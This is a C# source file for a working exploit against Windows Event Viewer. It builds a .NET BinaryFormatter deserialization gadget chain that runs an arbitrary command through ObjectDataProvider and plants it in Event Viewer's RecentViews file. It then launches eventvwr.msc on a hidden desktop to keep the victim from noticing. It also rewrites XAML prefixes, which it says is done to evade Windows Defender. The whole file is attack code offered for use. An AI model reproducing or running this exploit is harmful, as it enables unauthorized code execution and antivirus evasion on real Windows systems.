using System;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Data;
using System.Diagnostics;
using System.Runtime.Serialization;
using Microsoft.VisualStudio.Text.Formatting;
using System.Windows.Data;
using System.Collections.Specialized;
using System.Reflection;
using System.Xml;
using System.Text;
using System.Runtime.InteropServices;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Threading;
using System.Collections;
using System.Reflection.Emit;
using MS.Internal.Data;
using System.Runtime.CompilerServices;


namespace EventViewerDesearilizationExploit
{

    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
        {

        }

        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type typeTFRP = typeof(TextFormattingRunProperties);
            info.SetType(typeTFRP);
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            _xaml = xaml;
        }
    }
    
    [Serializable]
    public class DataSetMarshal : ISerializable
    {
        byte[] _fakeTable;

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(System.Data.DataSet));
            info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
            info.AddValue("DataSet.DataSetName", "");
            info.AddValue("DataSet.Namespace", "");
            info.AddValue("DataSet.Prefix", "");
            info.AddValue("DataSet.CaseSensitive", false);
            info.AddValue("DataSet.LocaleLCID", 0x409);
            info.AddValue("DataSet.EnforceConstraints", false);
            info.AddValue("DataSet.ExtendedProperties", (System.Data.PropertyCollection)null);
            info.AddValue("DataSet.Tables.Count", 1);
            info.AddValue("DataSet.Tables_0", _fakeTable);
        }

        public void SetFakeTable(byte[] bfPayload)
        {
            _fakeTable = bfPayload;
        }

        public DataSetMarshal(byte[] bfPayload)
        {
            SetFakeTable(bfPayload);
        }


        public DataSetMarshal(object fakeTable)
        {
            MemoryStream stm = new MemoryStream();
            BinaryFormatter fmt = new BinaryFormatter();
            fmt.Serialize(stm, fakeTable);
            SetFakeTable(stm.ToArray());
        }

        public DataSetMarshal(MemoryStream ms)
        {
            SetFakeTable(ms.ToArray());
        }
    }
    
    class Program
    {

        [DllImport("user32.dll")]
        public static extern IntPtr GetThreadDesktop(int dwThreadId);

        [DllImport("kernel32.dll")]
        public static extern int GetCurrentThreadId();


        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice,
            IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);


        [DllImport("user32.dll", SetLastError = true)]
        static extern bool CloseDesktop(IntPtr hDesktop);

        public const int UOI_NAME = 2;

        [DllImport("user32.dll", SetLastError = true)]
        public static extern int GetUserObjectInformation(IntPtr hObj, int nIndex, StringBuilder pvInfo, int nLength, out int lpnLengthNeeded);


        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(
         string lpApplicationName,
         string lpCommandLine,
         IntPtr lpProcessAttributes,
         IntPtr lpThreadAttributes,
         bool bInheritHandles,
         int dwCreationFlags,
         IntPtr lpEnvironment,
         string lpCurrentDirectory,
         ref STARTUPINFO lpStartupInfo,
         ref PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE = 0,
            DESKTOP_READOBJECTS = 0x0001,
            DESKTOP_CREATEWINDOW = 0x0002,
            DESKTOP_CREATEMENU = 0x0004,
            DESKTOP_HOOKCONTROL = 0x0008,
            DESKTOP_JOURNALRECORD = 0x0010,
            DESKTOP_JOURNALPLAYBACK = 0x0020,
            DESKTOP_ENUMERATE = 0x0040,
            DESKTOP_WRITEOBJECTS = 0x0080,
            DESKTOP_SWITCHDESKTOP = 0x0100,
            GENERIC_ALL = (uint)(DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
                            DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                            DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP),
        }

        private static string GetDesktopName(IntPtr desktopHandle)
        {
            const int bufferSize = 256;
            StringBuilder buffer = new StringBuilder(bufferSize);
            int result = GetUserObjectInformation(desktopHandle, UOI_NAME, buffer, bufferSize, out _);
            if (result == 0)
            {
                int error = Marshal.GetLastWin32Error();
                throw new System.ComponentModel.Win32Exception(error);
            }

            return buffer.ToString();
        }

        static void Main(string[] args)
        {

            Console.OutputEncoding = System.Text.Encoding.UTF8;
            string argument = "";
            string filename = "";
            if (args.Length > 0) 
            {
                filename = args[0];//"cmd.exe";
            }
            else 
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid command use: {0} cmd.exe [optional: /c start powershell]", AppDomain.CurrentDomain.FriendlyName);
                Console.ResetColor(); 
                return;
            }
            if (args.Length > 1) 
            {
                argument = string.Join(" ", args, 1, args.Length - 1);//"/c start powershell.exe";
            }
            



            KillEventViewer();
            
            string pathToCheck = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Event Viewer");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Checking if the path \"{0}\" exists...", pathToCheck);
            string filePath = Path.Combine(pathToCheck, "RecentViews");
            if (!Directory.Exists(pathToCheck))
            {
                Console.WriteLine("\"{0}\" does not exists, Creating directory...", pathToCheck);
                try
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Directory.CreateDirectory(pathToCheck);
                    Console.WriteLine("\"{0}\" created successfully...", pathToCheck);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("An error occurred creating the directory {0}, exiting...",pathToCheck);
                    Console.ResetColor();
                    return;
                }
            }
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("The path \"{0}\" exists...", pathToCheck);
            byte[] data= CreateSerializedData(filename, argument);
            if (data == null) 
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Failed to create the StartInSelectedDesktop, the antivirus most likely stopped its creation, exiting...");
                Cleanup();
                Console.ResetColor();
                return;
            }
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Saving exploit to \"{0}\"...", filePath);
            try
            {
                File.WriteAllBytes(filePath, data);
            }
            catch 
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Error saving exploit to \"{0}\", exiting...", filePath);
                Cleanup();
                Console.ResetColor();
                return;
            }
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Exploit saved to \"{0}\"...", filePath);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Creating FakeDesktop to hide GUI window");
            IntPtr hDesktop = CreateDesktop("FakeDesktop", IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
            
            if (hDesktop != IntPtr.Zero)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("FakeDesktop Created...");
                try
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("Starting Event Viewer In FakeDesktop...");
                    STARTUPINFO si = new STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = "FakeDesktop";
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    bool success = CreateProcess(
                        null,
                        "cmd /c start \"\" \"%windir%\\system32\\eventvwr.msc\"",
                        IntPtr.Zero,
                        IntPtr.Zero,
                        false,
                        48,
                        IntPtr.Zero,
                        null,
                        ref si,
                        ref pi);
                    if (success)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("Event Viewer started In FakeDesktop...");
                    }
                    else 
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Error starting Event Viewer In FakeDesktop, exiting...");
                        Cleanup();
                        Console.ResetColor();
                        return;
                    }

                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Error starting Event Viewer In FakeDesktop, exiting...");
                    Cleanup();
                    Console.ResetColor();
                    return;
                }
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Closing FakeDesktop...");
                Thread.Sleep(3000);
                CloseDesktop(hDesktop);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("FakeDesktop Closed...");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Failed to Create FakeDesktop, exiting...");
                Cleanup();
                Console.ResetColor();
                return;
            }
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Complete...");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("CleaningUp...");
            Cleanup();
            KillEventViewer();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("CleaningUp Complete...");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("All Done, Press enter to exit...");
            Console.ResetColor();
            Console.Read();
        }
        private static void Cleanup() 
        {
            try
            {
                File.Delete(Path.Combine(Path.GetTempPath(), "StartInSelectedDesktop.exe"));
            }
            catch { }
            string pathToCheck = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Event Viewer");
            string filePath = Path.Combine(pathToCheck, "RecentViews");
            try
            {
                File.Delete(filePath);
            }
            catch { }

        }
        private static byte[] CreateSerializedData(string file, string args)
        {
            string sourceCode = @"
using System;
using System.Runtime.InteropServices;


class HelloWorld
{
    [DllImport(""kernel32.dll"")]
    private static extern bool CreateProcess(
     string lpApplicationName,
     string lpCommandLine,
     IntPtr lpProcessAttributes,
     IntPtr lpThreadAttributes,
     bool bInheritHandles,
     int dwCreationFlags,
     IntPtr lpEnvironment,
     string lpCurrentDirectory,
     ref STARTUPINFO lpStartupInfo,
     ref PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    

    static void Main(string[] args)
    {
        string DesktopName=args[0];
        string argumentsAsString = string.Join("" "", args, 1, args.Length - 1);
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        si.lpDesktop = DesktopName;
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        bool success = CreateProcess(
            null,
            argumentsAsString,
            IntPtr.Zero,
            IntPtr.Zero,
            false,
            48,
            IntPtr.Zero,
            null,
            ref si,
            ref pi);
    }
}
";
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Compling StartInSelectedDesktop...");
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = Path.Combine(Path.GetTempPath(), "StartInSelectedDesktop.exe");

            CSharpCodeProvider codeProvider = new CSharpCodeProvider();
            CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, sourceCode);

            if (results.Errors.HasErrors)
            {
                return null;
            }

            int currentThreadId = GetCurrentThreadId();
            IntPtr desktopHandle = GetThreadDesktop(currentThreadId);
            string currentDesktopName = GetDesktopName(desktopHandle);

            string commandFilename = parameters.OutputAssembly;
            string baseargs= "\"" + file + "\" " + args;
            string commandArgs = currentDesktopName + " " + baseargs;

            Console.WriteLine("Exploit being created with '{0}' as arguements...", baseargs);

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = commandFilename,
                Arguments = commandArgs
            };
            StringDictionary dict = new StringDictionary();
            typeof(ProcessStartInfo).GetField("environmentVariables",System.Reflection.BindingFlags.Instance |System.Reflection.BindingFlags.NonPublic).SetValue(psi, dict);
            Process p = new Process
            {
                StartInfo = psi
            };
            Console.WriteLine("Abusing ObjectDataProvider for code execution...");
            ObjectDataProvider odp = new ObjectDataProvider
            {
                MethodName = "Start",
                IsInitialLoadEnabled = false,
                ObjectInstance = p
            };

            //_methodParameters
            XmlWriterSettings settings = new XmlWriterSettings();
            settings.Indent = true;
            StringBuilder sb = new StringBuilder();

            using (XmlWriter writer = XmlWriter.Create(sb, settings))
            {
                System.Windows.Markup.XamlWriter.Save(odp, writer);
            }

            string xPayload = sb.ToString();
            Console.WriteLine("Patching the xPayload to bypass windows defender...");
            xPayload = xPayload.Replace("xmlns:sd", "xmlns:sf");
            xPayload = xPayload.Replace("<sd:", "<sf:");
            xPayload = xPayload.Replace("</sd:", "</sf:");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("xPayload patched...");
            Console.ForegroundColor = ConsoleColor.Yellow;
            TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xPayload);
            
            using (MemoryStream stream = new MemoryStream())
            {
                Console.WriteLine("Creating the BinaryFormatter...");
                BinaryFormatter fmt = new BinaryFormatter();
                fmt.Serialize(stream, payload);
                byte[] binaryFormatterPayload = stream.ToArray();
                Console.WriteLine("Spoofing DataSets Tables_0 with payload...");
                DataSetMarshal payloadDataSetMarshal = new DataSetMarshal(binaryFormatterPayload);
                stream.Position = 0;
                fmt.Serialize(stream, payloadDataSetMarshal);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Exploit Created...");
                return stream.ToArray();
            }
        }

        private static void KillEventViewer()
        {
            
            try
            {
                // Find the Event Viewer process by name
                Process[] eventViewerProcesses = Process.GetProcessesByName("mmc");
                if (eventViewerProcesses.Length > 0) 
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("Killing EventViewer...");
                    foreach (Process process in eventViewerProcesses)
                    {
                        // Terminate the process
                        process.Kill();
                        process.WaitForExit(); // Wait for the process to exit (optional)
                    }
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("EventViewer killed...");
                }
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Error killing Event Viewer process, exiting...");
            }
        }

    }
}